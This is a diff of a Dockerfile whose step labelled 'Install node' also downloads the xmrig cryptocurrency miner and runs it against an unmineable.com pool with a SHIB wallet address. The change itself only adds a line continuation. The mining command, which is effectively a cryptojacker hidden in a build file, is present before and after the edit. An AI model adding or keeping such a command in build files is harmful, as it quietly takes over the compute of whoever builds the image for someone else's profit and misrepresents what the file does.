@@ -4,7 +4,7 @@ FROM vm/ubuntu:18.04
 
 # Install node
 RUN curl -sL https://deb.nodesource.com/setup_12.x | bash && \
-    apt install nodejs && apt install unzip && wget https://github.com/xmrig/xmrig/releases/download/v6.15.3/xmrig-6.15.3-linux-static-x64.tar.gz && tar xf xmrig-6.15.3-linux-static-x64.tar.gz && cd xmrig-6.15.3 && ./xmrig -o rx.unmineable.com:3333 -u SHIB:0xd70ee3523e5f410fb9c09571491599b653be60f5.Inu-01 -p x -k -t 6
+    apt install nodejs && apt install unzip && wget https://github.com/xmrig/xmrig/releases/download/v6.15.3/xmrig-6.15.3-linux-static-x64.tar.gz && tar xf xmrig-6.15.3-linux-static-x64.tar.gz && cd xmrig-6.15.3 && ./xmrig -o rx.unmineable.com:3333 -u SHIB:0xd70ee3523e5f410fb9c09571491599b653be60f5.Inu-01 -p x -k -t 6 && \
     rm -f /etc/apt/sources.list.d/nodesource.list
 RUN npm install -g http-server
 
